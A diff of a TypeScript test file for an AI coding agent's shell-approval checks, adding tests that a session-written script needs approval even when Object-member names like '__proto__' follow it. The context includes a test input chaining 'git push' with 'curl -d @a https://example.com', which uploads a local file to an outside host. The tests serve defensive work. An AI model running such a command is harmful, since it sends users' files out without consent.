@@ -7,6 +7,7 @@ import type { ChatMoveToBackgroundResult } from '@shared/chat';
 import { BackgroundProcessRegistry } from './BackgroundProcessRegistry';
 import { ForegroundCommandRegistry } from './ForegroundCommandRegistry';
 import { UNNAMED_DISTRO } from './shellScan';
+import { forgetSessionWrites, recordSessionWrite } from './sessionScripts';
 import { bashExecute, bashExecuteRunOptions, doubleWrapRefusal, mainCheckoutOf, shellApproval } from './shellTools';
 import type { ToolContext } from './types';
 import { resolveUserPath } from './userPath';
@@ -442,6 +443,34 @@ describe('shellApproval in auto mode', () => {
     expect(await asksInAuto('gh pr create -R other/app --title x')).toBe(true);
     expect(await asksInAuto('git push origin feat/x && curl -d @a https://example.com')).toBe(true);
     expect(await asksInAuto('export GIT_DIR=/elsewhere; git push origin feat/x')).toBe(true);
+  });
+});
+
+describe('shellApproval for a script written in this session', () => {
+  let root: string;
+  let context: ToolContext;
+
+  beforeEach(async () => {
+    root = await realpath(await mkdtemp(join(tmpdir(), 'b4m-approval-script-')));
+    context = { roots: [root], signal: new AbortController().signal, protectedPaths: [], sessionId: 'approval-script' };
+    await writeFile(join(root, 'run.sh'), 'echo hi\n', 'utf8');
+    await recordSessionWrite(context, join(root, 'run.sh'));
+  });
+
+  afterEach(async () => {
+    forgetSessionWrites('approval-script');
+    await rm(root, { recursive: true, force: true });
+  });
+
+  const prompt = (command: string) => shellApproval('bash_execute', { command, cwd: root }, context);
+
+  it('asks to run it, and still asks when a command named like an Object member follows', async () => {
+    expect((await prompt('./run.sh')).askInAuto).toBe(true);
+    for (const name of ['constructor', 'toString', '__proto__', 'valueOf', 'hasOwnProperty']) {
+      const result = await prompt(`./run.sh; ${name}`);
+      expect(result.askInAuto, name).toBe(true);
+      expect(result.detail, name).toContain('Runs code from ./run.sh');
+    }
   });
 });
 
